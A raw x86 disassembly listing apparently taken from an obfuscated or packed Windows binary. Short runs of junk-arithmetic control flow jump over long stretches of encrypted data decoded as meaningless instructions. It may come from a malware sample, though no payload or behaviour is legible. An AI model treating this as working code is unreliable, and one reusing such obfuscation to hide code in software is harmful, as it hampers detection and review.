  40b648:	scas   eax,DWORD PTR es:[edi]
  40b649:	clc    
  40b64a:	and    esp,ebp
  40b64c:	lods   al,BYTE PTR ds:[esi]
  40b64d:	fistp  WORD PTR [edx]
  40b64f:	pop    ebp
  40b650:	push   0x76018680
  40b655:	aad    0xa6
  40b657:	mov    edx,DWORD PTR [ebp-0x10]
  40b65a:	or     eax,edx
  40b65c:	xor    eax,0x59f6
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x5f8e9e60,eax
  40b6b1:	jle    0x40b682
  40b6b3:	call   0xbec4:0x92bebeb7
  40b6ba:	mov    esi,0xc1cb6ed6
  40b6bf:	sti    
  40b6c0:	inc    esp
  40b6c1:	jmp    0x7809732a
  40b6c6:	repz sbb al,0x42
  40b6c9:	pushf  
  40b6ca:	sar    BYTE PTR [esi-0x28],0x2a
  40b6ce:	out    dx,al
  40b6cf:	sti    
  40b6d0:	cwde   
  40b6d1:	push   ds
  40b6d2:	stc    
  40b6d3:	bsf    ebx,DWORD PTR [edi-0x763e36e9]
  40b6da:	push   cs
  40b6db:	or     eax,0xe992436a
  40b6e0:	stos   BYTE PTR es:[edi],al
  40b6e1:	in     al,0xfe
  40b6e3:	or     al,0x89
  40b6e5:	cld    
  40b6e6:	lods   al,BYTE PTR ds:[esi]
  40b6e7:	and    dh,BYTE PTR [ecx+0x2cb71788]
  40b6ed:	mov    ch,BYTE PTR [eax+0x303652eb]
  40b6f3:	jae    0x40b6c5
  40b6f5:	test   eax,0x8fae0c62
  40b6fa:	popf   
  40b6fb:	push   eax
  40b6fc:	dec    ebx
  40b6fd:	xchg   dl,bl
  40b6ff:	cmp    BYTE PTR [edi-0x42acbfae],ah
  40b705:	into   
  40b706:	mov    ah,0xa0
  40b708:	adc    al,0x2c
  40b70a:	pop    ecx
  40b70b:	pop    ebp
  40b70c:	pop    edx
  40b70d:	sbb    edx,edi
  40b70f:	(bad)  
  40b710:	mov    ds:0x5a051419,al
  40b715:	loope  0x40b700
  40b717:	les    eax,FWORD PTR [edx]
  40b719:	push   edx
  40b71a:	add    eax,0x48470050
  40b71f:	and    al,0x55
  40b721:	xchg   esp,eax
  40b722:	mov    edx,DWORD PTR [ebx-0xd]
  40b725:	push   ebp
  40b726:	out    dx,al
  40b727:	mov    ebx,0x6a710e8e
  40b72c:	xor    al,0xe4
  40b72e:	fdivr  DWORD PTR [ebp+0x34]
  40b731:	and    esi,DWORD PTR [esi+0x49179682]
  40b737:	cs in  al,0x39
  40b73a:	push   ebp
  40b73b:	shr    DWORD PTR [esi],0x23
  40b73e:	shr    DWORD PTR [ecx+0x49],0xf7
  40b742:	pop    edx
  40b743:	cmovg  esi,DWORD PTR [esi-0x62fc9085]
  40b74a:	xchg   edi,eax
  40b74b:	(bad)  
  40b74c:	mov    dh,0xa2
  40b74e:	sbb    BYTE PTR [ebx],bh
  40b750:	adc    esi,DWORD PTR [edx-0x2e]
  40b753:	fiadd  WORD PTR [ebx+edi*4]
  40b756:	in     eax,dx
  40b757:	shl    esp,cl
  40b759:	and    BYTE PTR [edx],0x51
  40b75c:	mov    bh,0xe4
  40b75e:	xchg   esi,eax
  40b75f:	dec    ebp
  40b760:	lods   eax,DWORD PTR ds:[esi]
  40b761:	mov    ch,0xaa
  40b763:	adc    al,0xdf
  40b765:	jb     0x40b7cf
  40b767:	loope  0x40b746
  40b769:	ret    
  40b76a:	mov    bh,0x66
  40b76c:	rcl    DWORD PTR [ecx],cl
  40b76e:	outs   dx,BYTE PTR ds:[esi]
  40b76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b770:	mov    ebx,0x26f9b79e
  40b775:	push   ss
  40b776:	and    ch,BYTE PTR [ebx+edx*8+0x6d1799aa]
  40b77d:	jp     0x40b7fe
  40b77f:	xchg   edi,eax
  40b780:	mov    WORD PTR [edx+eax*2],fs
  40b783:	xchg   ebp,eax
  40b784:	sub    BYTE PTR [ebx+0x2c],bl
  40b787:	test   al,0x46
  40b789:	retf   0x7a70
  40b78c:	imul   esp,DWORD PTR [esi+0x21],0x3e
  40b790:	in     al,0x33
  40b792:	jns    0x40b7f2
  40b794:	test   eax,0x92933334
  40b799:	into   
  40b79a:	test   eax,0x326a20ab
  40b7a0:	out    0x2c,eax
  40b7a2:	ds stos BYTE PTR es:[edi],al
  40b7a4:	jmp    DWORD PTR [edi+eiz*1+0xb]
  40b7a8:	mov    eax,ds:0x99579282
  40b7ad:	cmp    eax,0x1ede691d
  40b7b2:	mov    al,ds:0xbb24c1af
  40b7b7:	mov    ch,BYTE PTR [eax+0x45]
  40b7ba:	mov    edx,0x1ea743d7
  40b7bf:	ins    BYTE PTR es:[edi],dx
  40b7c0:	imul   edi,DWORD PTR [ecx+0x7bbf8424],0x70
  40b7c7:	and    BYTE PTR [edi],0x7e
  40b7ca:	mov    ?,WORD PTR [esi+0x51a96b85]
  40b7d0:	loopne 0x40b7fe
  40b7d2:	dec    esi
  40b7d3:	mov    DWORD PTR [ebp+esi*1-0x1dec359e],ebp
  40b7da:	push   eax
  40b7db:	aam    0x36
  40b7dd:	xchg   DWORD PTR [edi+0x3c],edi
  40b7e0:	push   0x523ed8f8
  40b7e5:	fisub  DWORD PTR [esi+0x52]
  40b7e8:	mov    bh,0xc8
  40b7ea:	pop    edi
  40b7eb:	jmp    0x6867:0x5a6c4fbd
  40b7f2:	cmp    al,0xc1
  40b7f4:	fld    QWORD PTR [edi+0x7f40cedd]
  40b7fa:	(bad)  
  40b7fc:	xor    BYTE PTR fs:[ecx+edx*2+0x65],dh
  40b801:	fwait
  40b802:	aad    0x1c
  40b804:	mov    ebx,0x4f5c97dc
  40b809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b80a:	adc    al,0xd9
  40b80c:	inc    eax
  40b80d:	outs   dx,DWORD PTR ds:[esi]
  40b80e:	add    eax,0x2a0341a4
  40b813:	cmp    al,0x2e
  40b815:	push   ebp
  40b816:	lds    edx,FWORD PTR ds:0xc8dec2d2
  40b81c:	cli    
  40b81d:	das    
  40b81e:	loope  0x40b7d6
  40b820:	aad    0xbd
  40b822:	add    al,0xb4
  40b824:	in     eax,dx
  40b825:	jp     0x40b810
  40b827:	out    0x78,al
  40b829:	jg     0x40b814
  40b82b:	mov    eax,0x2d9c2704
  40b830:	test   ebx,esp
  40b832:	pop    esp
  40b833:	sbb    BYTE PTR [esp+ebp*2-0x365052e3],dl
  40b83a:	(bad)  
  40b83b:	fs loope 0x40b7e8
  40b83e:	retf   0x162e
  40b841:	aas    
  40b842:	fisubr WORD PTR [ecx+0x38]
  40b845:	bnd ret 
  40b847:	pop    eax
  40b848:	jnp    0x40b8ae
  40b84a:	mov    ch,0xd7
  40b84c:	jmp    0x33d4:0xf9413b2e
  40b853:	shl    BYTE PTR [edx+ebp*8-0x281dbe5f],0xd3
  40b85b:	push   eax
  40b85c:	and    eax,ebx
  40b85e:	pop    ebx
  40b85f:	mov    edx,0xf739baef
  40b864:	es hlt 
  40b866:	int    0xc0
  40b868:	inc    ebp
  40b869:	cmp    al,BYTE PTR [eax+0x2a9a62b8]
  40b86f:	push   cs
  40b870:	jge    0x40b887
  40b872:	test   eax,0x2d710c67
  40b877:	imul   cx,WORD PTR [edi],0x3e00
  40b87c:	xchg   ebp,eax
  40b87d:	push   ebp
  40b87e:	aas    
  40b87f:	jle    0x40b84f
  40b881:	fdivr  st,st(6)
  40b883:	jb     0x40b89c
  40b885:	xor    DWORD PTR [ebp-0x50],ebp
  40b888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b889:	pop    esi
  40b88a:	loope  0x40b888
  40b88c:	inc    esi
  40b88d:	(bad)  
  40b88e:	sub    ecx,ecx
  40b890:	sub    DWORD PTR [esi+0x54456067],0xd30fdbad
  40b89a:	aam    0x3b
  40b89c:	in     eax,0x45
  40b89e:	call   0xa7f7329c
  40b8a3:	jle    0x40b86b
  40b8a5:	and    eax,0xb564445a
  40b8aa:	dec    ebp
  40b8ab:	pop    esi
  40b8ac:	loopne 0x40b868
  40b8ae:	jo     0x40b8c3
  40b8b0:	pop    ecx
  40b8b1:	popa   
  40b8b2:	(bad)  
  40b8b4:	mov    edx,0xe883b8fb
  40b8b9:	add    DWORD PTR [esp+eax*2+0x1],edx
  40b8bd:	daa    
  40b8be:	sbb    eax,0xb20dde63
  40b8c3:	add    eax,0x31ea3f91
  40b8c8:	mov    dl,0x78
  40b8ca:	sub    DWORD PTR [eax-0x66],0x4f286fa1
  40b8d1:	jb     0x40b918
  40b8d3:	popa   
  40b8d4:	outs   dx,BYTE PTR ds:[esi]
  40b8d5:	push   esp
  40b8d6:	and    eax,0x23adaab0
  40b8db:	push   eax
  40b8dc:	loopne 0x40b91b
  40b8de:	dec    ebp
  40b8df:	ret    
  40b8e0:	jbe    0x40b8fc
  40b8e2:	pop    edi
  40b8e3:	dec    esi
  40b8e4:	mov    ch,0x23
  40b8e6:	mov    DWORD PTR [edi],ebx
  40b8e8:	lea    ecx,[esi+0x23]
  40b8eb:	jmp    0xac1d488c
  40b8f0:	fwait
  40b8f1:	push   esi
  40b8f2:	mov    ds:0xea63eab0,eax
  40b8f7:	test   DWORD PTR [ebx+0x9],esi
  40b8fa:	aad    0xe2
  40b8fc:	sbb    BYTE PTR [ecx],bl
  40b8fe:	inc    edx
  40b8ff:	xchg   esp,eax
  40b900:	imul   ebp,DWORD PTR [eax-0x16],0x7
  40b904:	std    
  40b905:	out    dx,eax
  40b906:	cmc    
  40b907:	scas   al,BYTE PTR es:[edi]
  40b908:	xor    eax,0xabbf69f0
  40b90d:	shl    DWORD PTR [ecx],0x36
  40b910:	out    0x61,eax
  40b912:	jge    0x40b8fd
  40b914:	pop    ds
  40b915:	xor    DWORD PTR [esi+0x6e],eax
  40b918:	scas   al,BYTE PTR es:[edi]
  40b919:	(bad)  
  40b91b:	neg    BYTE PTR [ebx+0x730685b7]
  40b921:	jp     0x40b976
  40b923:	lahf   
  40b924:	mov    edx,0x8b3766e1
  40b929:	fwait
  40b92a:	test   eax,0xb9dffaa7
  40b92f:	outs   dx,DWORD PTR ds:[esi]
  40b930:	aas    
  40b931:	cmp    eax,0xeb6fff36
  40b936:	lods   eax,DWORD PTR cs:[esi]
  40b938:	adc    DWORD PTR [ecx-0x25],0xd714a8ec
  40b93f:	dec    ebp
  40b940:	cdq    
  40b941:	ins    BYTE PTR es:[edi],dx
  40b942:	adc    esp,eax
  40b944:	dec    ebp
  40b945:	out    dx,al
  40b946:	inc    esi
  40b947:	sbb    DWORD PTR [eax],esp
  40b949:	imul   ebx,DWORD PTR [eax-0x36826633],0x56
  40b950:	ret    0xad18
  40b953:	and    al,dl
  40b955:	xor    cl,BYTE PTR [esi+ebx*8]
  40b958:	(bad)  
  40b959:	inc    ebp
  40b95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95b:	jl     0x40b96c
  40b95d:	jmp    0xcc287bf9
  40b962:	xor    ecx,DWORD PTR ds:0xd3ba3f4d
  40b968:	jge    0x40b9d9
  40b96a:	addr16 aaa 
  40b96c:	fldenv [edi-0x76094f81]
  40b972:	mov    cl,0x96
  40b974:	pop    ds
  40b975:	mov    edi,0x88b43cae
  40b97a:	gs jge 0x40b916
  40b97d:	mov    eax,ds:0xd35b774a
  40b982:	outs   dx,DWORD PTR ds:[esi]
  40b983:	and    DWORD PTR [ebx-0x13],edx
  40b986:	pop    es
  40b987:	add    dh,BYTE PTR [edx]
  40b989:	ret    
  40b98a:	xchg   DWORD PTR [eax+0x38fa6471],esi
  40b990:	rcl    BYTE PTR [esi],cl
  40b992:	hlt    
  40b993:	mov    edi,0x52f70e27
  40b998:	dec    esi
  40b999:	pop    eax
  40b99a:	test   ecx,edi
  40b99c:	jb     0x40b993
  40b99e:	(bad)  
  40b99f:	mov    eax,ds:0x36decb32
  40b9a4:	cli    
  40b9a5:	sub    BYTE PTR [edi],bl
  40b9a7:	pusha  
  40b9a8:	or     al,0xa
  40b9aa:	jle    0x40b9aa
  40b9ac:	adc    DWORD PTR [esi],0x14
  40b9af:	jle    0x40b9d7
  40b9b1:	xchg   DWORD PTR [ebp+0x22],ecx
  40b9b4:	xor    ebp,DWORD PTR [esp+esi*1+0x7c]
  40b9b8:	or     eax,DWORD PTR [ebx]
  40b9ba:	push   0x2b
  40b9bc:	daa    
  40b9bd:	in     al,0x71
  40b9bf:	js     0x40b97c
  40b9c1:	cmc    
  40b9c2:	(bad)  
  40b9c4:	test   DWORD PTR [ebx],edx
  40b9c6:	ds inc edx
  40b9c8:	xor    al,0xbd
  40b9ca:	fld    QWORD PTR [ebp-0x73f2bc34]
  40b9d0:	ja     0x40b988
  40b9d2:	rol    edi,cl
  40b9d4:	push   esp
  40b9d5:	(bad)  
  40b9d6:	cmp    BYTE PTR [edx],ch
  40b9d8:	ret    
  40b9d9:	fwait
  40b9da:	lods   eax,DWORD PTR ds:[esi]
  40b9db:	fcmove st,st(1)
  40b9dd:	ss retf 0x57b2
  40b9e1:	shr    esi,0xcf
  40b9e4:	rcl    edx,1
  40b9e6:	jp     0x40b9b4
  40b9e8:	jl     0x40b978
  40b9ea:	rol    DWORD PTR [edi],cl
  40b9ec:	inc    esp
  40b9ed:	pop    ds
  40b9ee:	mov    bh,0x25
  40b9f0:	lods   al,BYTE PTR ds:[esi]
  40b9f1:	out    dx,al
  40b9f2:	retf   0x74a0
  40b9f5:	mov    bl,BYTE PTR [ecx-0x27]
  40b9f8:	hlt    
  40b9f9:	pop    ss
  40b9fa:	clc    
  40b9fb:	test   BYTE PTR [ebx],ah
  40b9fd:	mov    WORD PTR [edi+0x19],es
  40ba00:	mov    ebx,0x1ad424ea
  40ba05:	test   DWORD PTR [ecx-0x41],0x36c2e248
  40ba0c:	xor    esi,DWORD PTR [esi+0x1d3f7778]
  40ba12:	inc    esi
  40ba13:	sbb    eax,0xabc11944
  40ba18:	fnstenv [edi+0x5a91aa3c]
  40ba1e:	(bad)  
  40ba1f:	in     eax,dx
  40ba20:	(bad)  
  40ba21:	push   eax
  40ba22:	fbstp  TBYTE PTR [ecx+ebp*8]
  40ba25:	push   ecx
  40ba26:	mov    dh,0xaa
  40ba28:	out    dx,al
  40ba29:	add    BYTE PTR [edx+0x13],al
  40ba2c:	shl    BYTE PTR [esi],0x88
  40ba2f:	add    BYTE PTR [edx],al
  40ba31:	mov    WORD PTR [ecx],fs
  40ba33:	test   DWORD PTR [ebp-0x4c789856],eax
  40ba39:	xor    esi,edi
  40ba3b:	sti    
  40ba3c:	retf   0x462a
  40ba3f:	shr    bl,1
  40ba41:	xor    al,BYTE PTR ds:0xe66fed1b
  40ba47:	div    bl
  40ba49:	inc    edx
  40ba4a:	jmp    0x40ba8c
  40ba4c:	mov    bh,BYTE PTR [ecx+0x703756b9]
  40ba52:	mov    al,BYTE PTR [eax]
  40ba54:	inc    edi
  40ba55:	inc    ebx
  40ba56:	shl    BYTE PTR [eax],1
  40ba58:	mov    ds:0xddb2faf2,al
  40ba5d:	xor    ebp,DWORD PTR [edx]
  40ba5f:	test   eax,0xf609e6ac
  40ba64:	and    eax,ecx
  40ba66:	push   edi
  40ba67:	add    ah,BYTE PTR [ecx+0x6c918ee9]
  40ba6d:	mov    BYTE PTR [eax+0x118fbff7],ch
  40ba73:	js     0x40ba3f
  40ba75:	ja     0x40ba58
  40ba77:	xlat   BYTE PTR ds:[ebx]
  40ba78:	dec    ebp
  40ba79:	xchg   ebp,eax
  40ba7a:	loop   0x40ba4e
  40ba7c:	iret   
  40ba7d:	mov    ah,0xc9
  40ba7f:	fsubr  DWORD PTR [edx]
  40ba81:	jecxz  0x40ba15
  40ba83:	fisubr DWORD PTR [edi+0x29]
  40ba86:	call   0x1975744e
  40ba8b:	hlt    
  40ba8c:	sub    DWORD PTR [ebp-0x38],esp
  40ba8f:	jp     0x40bab5
  40ba91:	mov    bh,0xa9
  40ba93:	xchg   edx,eax
  40ba94:	xor    ebx,ecx
  40ba96:	(bad)  
  40ba97:	pushf  
  40ba98:	(bad)  
  40ba99:	std    
  40ba9a:	push   edx
  40ba9b:	retf   0x191b
  40ba9e:	imul   esi,edi,0xa40a3779
  40baa4:	mov    eax,ds:0x1dcaadc8
  40baa9:	mov    DWORD PTR [ebp-0x4],0x61c2
  40bab0:	mov    eax,DWORD PTR [ebp-0x4]
  40bab3:	mov    ecx,DWORD PTR [ebp-0x8]
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x4226f8
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x42282c
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	mov    edx,0x6e90909f
  40bb12:	mov    edi,0xc492bebe
  40bb17:	mov    esi,0x46d67be
  40bb1c:	ret    0x10df
  40bb1f:	scas   al,BYTE PTR es:[edi]
  40bb20:	sbb    eax,DWORD PTR [edx+0x68df4650]
  40bb26:	sar    BYTE PTR ds:0x804b3231,0x34
  40bb2d:	sub    bh,bl
  40bb2f:	jno    0x40bb95
  40bb31:	retf   
  40bb32:	xlat   BYTE PTR ds:[ebx]
  40bb33:	and    eax,0xe346ae4f
  40bb38:	xchg   ecx,eax
  40bb39:	lods   eax,DWORD PTR ds:[esi]
  40bb3a:	sub    bl,BYTE PTR [eax-0x12]
  40bb3d:	push   ss
  40bb3e:	retf   
  40bb3f:	and    al,0x46
  40bb41:	mov    eax,ecx
  40bb43:	clc    
  40bb44:	and    al,BYTE PTR [edx+0x79]
  40bb47:	mov    esi,0xc110b02e
  40bb4c:	push   ebx
  40bb4d:	cdq    
  40bb4e:	in     eax,0x2
  40bb50:	fiadd  WORD PTR [edx+0x19d0f4e5]
  40bb56:	push   ebp
  40bb57:	jmp    0xea784ad1
  40bb5c:	sub    eax,DWORD PTR [eax]
  40bb5e:	lds    ebp,FWORD PTR [ebx+0x6c525f81]
  40bb64:	test   DWORD PTR [ebp+ebp*4+0x5c],ecx
  40bb68:	(bad)  
  40bb69:	test   DWORD PTR [esi-0xb],0xefa3d716
  40bb70:	dec    ecx
  40bb71:	sbb    DWORD PTR [eax],esi
  40bb73:	mov    eax,ds:0x6ebf683e
  40bb78:	pushf  
  40bb79:	or     BYTE PTR [edi+0x265e7d82],bh
  40bb7f:	data16 fisub DWORD PTR [edx+0x18]
  40bb83:	mov    ?,WORD PTR [ebx-0xa313378]
  40bb89:	mov    bl,0xca
  40bb8b:	data16 sbb dh,bh
  40bb8e:	mov    esp,0x4e8fca58
  40bb93:	test   al,0xca
  40bb95:	mov    dl,0x96
  40bb97:	cmp    al,0xbf
  40bb99:	or     dh,BYTE PTR [esi+esi*2]
  40bb9c:	and    DWORD PTR ds:0xcb4a2718,ecx
  40bba2:	pop    ds
  40bba3:	ja     0x40bc07
  40bba5:	int3   
  40bba6:	lods   eax,DWORD PTR ds:[esi]
  40bba7:	push   esp
  40bba8:	jmp    0xcf3f:0xbf148001
  40bbaf:	fdiv   QWORD PTR [ecx]
  40bbb1:	jge    0x40bbea
  40bbb3:	cmp    esp,DWORD PTR [edx+eax*2+0x5807281f]
  40bbba:	data16 icebp 
  40bbbc:	sub    DWORD PTR [ebx],edx
  40bbbe:	cmp    edi,ebp
  40bbc0:	dec    ecx
  40bbc1:	and    DWORD PTR [ebx+0x6],0x38
  40bbc5:	es jb  0x40bb83
  40bbc8:	rcl    BYTE PTR [esi+edx*2],1
  40bbcb:	jb     0x40bc11
  40bbcd:	or     dl,BYTE PTR ds:0xf326502b
  40bbd3:	adc    eax,0x605b694b
  40bbd8:	iret   
  40bbd9:	xor    al,0x63
  40bbdb:	out    dx,al
  40bbdc:	fisttp DWORD PTR [edi+0x5b1ba63b]
  40bbe2:	loopne 0x40bc5b
  40bbe4:	outs   dx,DWORD PTR ds:[esi]
  40bbe5:	stc    
  40bbe6:	push   di
  40bbe8:	mov    ebp,0x2362c714
  40bbed:	clc    
  40bbee:	imul   ebx,DWORD PTR [ecx+0x75],0xffffffe6
  40bbf2:	fimul  WORD PTR [edx]
  40bbf4:	inc    esp
  40bbf5:	jge    0x40bba0
  40bbf7:	ins    DWORD PTR es:[edi],dx
  40bbf8:	xchg   DWORD PTR [ecx+0x71e52a33],edx
  40bbfe:	or     eax,0x36e36c56
  40bc03:	sar    ebp,1
  40bc05:	lock js 0x40bbed
  40bc08:	hlt    
  40bc09:	or     ecx,DWORD PTR [ebx+0x5f850dc9]
  40bc0f:	stos   BYTE PTR es:[edi],al
  40bc10:	jl     0x40bc35
  40bc12:	in     al,0xb6
  40bc14:	xor    DWORD PTR [ecx],edx
  40bc16:	repnz cmp DWORD PTR [eax+0x64],0xffffffa7
  40bc1b:	mov    al,0x58
  40bc1d:	jnp    0x40bba2
  40bc1f:	jl     0x40bbe5
  40bc21:	repz pushf 
  40bc23:	and    al,0x47
  40bc25:	sbb    ah,BYTE PTR [ecx-0x25833a4a]
  40bc2b:	imul   ebp,eax,0x43
  40bc2e:	sub    bh,BYTE PTR [esp+ebp*8-0x64c3445c]
  40bc35:	jns    0x40bbf7
  40bc37:	push   es
  40bc38:	(bad)  [esi]
  40bc3a:	jo     0x40bca2
  40bc3c:	(bad)  
  40bc3d:	pop    ecx
  40bc3e:	cmp    DWORD PTR [bp+0xcd3],0x35
  40bc44:	mov    bl,0x63
  40bc46:	repnz fild WORD PTR [esi+0x79]
  40bc4a:	and    DWORD PTR [eax],ecx
  40bc4c:	jb     0x40bc6c
  40bc4e:	jl     0x40bc41
  40bc50:	inc    esi
  40bc51:	das    
  40bc52:	fimul  WORD PTR [ecx+0x2a]
  40bc55:	enter  0xea37,0x8
  40bc59:	mov    ds:0xedb53daf,eax
  40bc5e:	mov    al,0x66
  40bc60:	scas   al,BYTE PTR es:[edi]
  40bc61:	scas   al,BYTE PTR es:[edi]
  40bc62:	ins    BYTE PTR es:[edi],dx
  40bc63:	adc    BYTE PTR [ebp+0x4b],ch
  40bc66:	push   esi
  40bc67:	adc    BYTE PTR [edi],0x79
  40bc6a:	xchg   esi,eax
  40bc6b:	idiv   BYTE PTR [edi-0x2dc181e3]
  40bc71:	push   esi
  40bc72:	pushf  
  40bc73:	sub    ch,BYTE PTR [eax-0x62]
  40bc76:	adc    eax,0xd6a64474
  40bc7b:	mov    ecx,0xd06325a7
  40bc80:	jmp    0xc49949e
  40bc85:	lock or DWORD PTR [ebx],ecx
  40bc88:	pop    ss
  40bc89:	mov    al,ds:0x41175ccd
  40bc8e:	mov    esi,0x78e92001
  40bc93:	or     al,0xf3
  40bc95:	lds    edx,FWORD PTR [esi-0x1e32d373]
  40bc9b:	repz hlt 
  40bc9d:	fdivr  st,st(7)
  40bc9f:	repnz out 0xd,eax
  40bca2:	(bad)  
  40bca3:	(bad)
  40bca6:	jae    0x40bcaa
  40bca8:	dec    esp
  40bca9:	adc    BYTE PTR [edx-0x11bfa8c],bh
  40bcaf:	aad    0x46
  40bcb1:	(bad)  
  40bcb2:	(bad)  
  40bcb4:	add    BYTE PTR [edx+0x4574dd7a],ch
  40bcba:	mov    ch,0xf5
  40bcbc:	loopne 0x40bc56
  40bcbe:	mov    WORD PTR [ebx-0x1b],es
  40bcc1:	xchg   ecx,eax
  40bcc2:	nop
  40bcc3:	inc    edi
  40bcc4:	mov    cl,0x94
  40bcc6:	mov    edi,esi
  40bcc8:	pop    esp
  40bcc9:	mov    bl,0x36
  40bccb:	pop    ebx
  40bccc:	inc    ebx
  40bccd:	in     al,dx
  40bcce:	mov    dl,0x3e
  40bcd0:	test   al,0x55
  40bcd2:	push   edi
  40bcd3:	mov    eax,0x1f7e7569
  40bcd8:	cld    
  40bcd9:	rol    BYTE PTR [eax],1
  40bcdb:	mov    ch,0x82
  40bcdd:	es (bad) 
  40bcdf:	ins    DWORD PTR es:[edi],dx
  40bce0:	fwait
  40bce1:	xadd   DWORD PTR [esi+0x1e],eax
  40bce5:	xchg   ebx,eax
  40bce6:	xchg   ebp,eax
  40bce7:	cwde   
  40bce8:	fldenv [ebp+0x58d64768]
  40bcee:	sar    DWORD PTR [ebx+0x5b],0x71
  40bcf2:	cld    
  40bcf3:	loop   0x40bcc8
  40bcf5:	xchg   edx,eax
  40bcf6:	fisttp DWORD PTR [ebp+0x4f20cea8]
  40bcfc:	stc    
  40bcfd:	es sub eax,0x49b587de
  40bd03:	jb     0x40bd37
  40bd05:	pop    ebx
  40bd06:	push   cs
  40bd07:	or     BYTE PTR [ebp-0x3d],al
  40bd0a:	pop    edi
  40bd0b:	add    DWORD PTR [ebp+0x3a],ebp
  40bd0e:	inc    eax
  40bd0f:	inc    ebx
  40bd10:	lock cmp dh,BYTE PTR [eax-0xcd8f7fb]
  40bd17:	jne    0x40bd5c
  40bd19:	mov    ds:0xca475397,al
  40bd1e:	inc    edx
  40bd1f:	adc    ecx,DWORD PTR [edi]
  40bd21:	mov    al,0x3b
  40bd23:	nop
  40bd24:	pop    es
  40bd25:	xor    BYTE PTR [edi+0x73],ah
  40bd28:	popa   
  40bd29:	ja     0x40bd56
  40bd2b:	div    BYTE PTR [esi]
  40bd2d:	mov    ah,BYTE PTR [edi-0x3f]
  40bd30:	inc    edx
  40bd31:	push   0x72
  40bd33:	js     0x40bd80
  40bd35:	jecxz  0x40bcb8
  40bd37:	scas   al,BYTE PTR es:[edi]
  40bd38:	adc    BYTE PTR fs:[edx+edi*8-0x12],al
  40bd3d:	xchg   ebx,eax
  40bd3e:	fs cld 
  40bd40:	cs mov cl,0x42
  40bd43:	add    eax,0xeeb126b2
  40bd48:	retf   0xe634
  40bd4b:	in     al,dx
  40bd4c:	popf   
  40bd4d:	pop    edx
  40bd4e:	bound  esi,QWORD PTR [ebx+0x64195b9b]
  40bd54:	jmp    0x40bdbb
  40bd56:	aam    0xb3
  40bd58:	jb     0x40bd26
  40bd5a:	jmp    0x40bd46
  40bd5c:	jae    0x40bd2e
  40bd5e:	mov    cl,0x75
  40bd60:	scas   eax,DWORD PTR es:[edi]
  40bd61:	mov    ah,0xbb
  40bd63:	sbb    al,0xec
  40bd65:	sahf   
  40bd66:	test   BYTE PTR [ebx+eax*8+0x76028c71],ah
  40bd6d:	retf   
  40bd6e:	ja     0x40bd0f
  40bd70:	inc    ebx
  40bd71:	ins    DWORD PTR es:[edi],dx
  40bd72:	jo     0x40bd89
  40bd74:	mov    al,ds:0x4cf1e992
  40bd79:	adc    eax,0x5ac271a4
  40bd7e:	cmp    eax,0x9b71e36a
  40bd83:	and    BYTE PTR [ebp+0xbea8465],cl
  40bd89:	mov    WORD PTR [eax],es
  40bd8b:	leave  
  40bd8c:	leave  
  40bd8d:	xor    esp,DWORD PTR [edi+ebx*2+0x17]
  40bd91:	js     0x40bd92
  40bd93:	jae    0x40bd94
  40bd95:	xchg   edx,eax
  40bd96:	ds adc eax,0xab68d3a2
  40bd9c:	mov    ebx,DWORD PTR [edi+edx*8-0x49c3e7d6]
  40bda3:	sub    ecx,DWORD PTR [ecx]
  40bda5:	retf   0x72ba
  40bda8:	inc    ecx
  40bda9:	mov    ebx,0x85b717cd
  40bdae:	out    0x3a,eax
  40bdb0:	sbb    DWORD PTR [ecx+edi*8],edx
  40bdb3:	xor    eax,0xee492496
  40bdb8:	push   es
  40bdb9:	xchg   DWORD PTR ds:[edx-0x50],edi
  40bdbd:	std    
  40bdbe:	pop    es
  40bdbf:	daa    
  40bdc0:	nop
  40bdc1:	das    
  40bdc2:	shl    BYTE PTR [edi+0x3bf70bce],1
  40bdc8:	into   
  40bdc9:	and    bl,bl
  40bdcb:	not    BYTE PTR [ecx]
  40bdcd:	fwait
  40bdce:	mov    dl,0x1
  40bdd0:	mov    al,0x5a
  40bdd2:	sbb    al,0x5e
  40bdd4:	jge    0x40bd79
  40bdd6:	sti    
  40bdd7:	xchg   ebp,eax
  40bdd8:	test   al,0xc9
  40bddb:	stc    
  40bddc:	and    al,al
  40bdde:	scas   al,BYTE PTR es:[edi]
  40bddf:	not    DWORD PTR [esi+0x6f045dd5]
  40bde5:	pop    ebx
  40bde6:	or     eax,0x5d32f848
  40bdeb:	or     ch,BYTE PTR [esi+0x12]
  40bdee:	push   ds
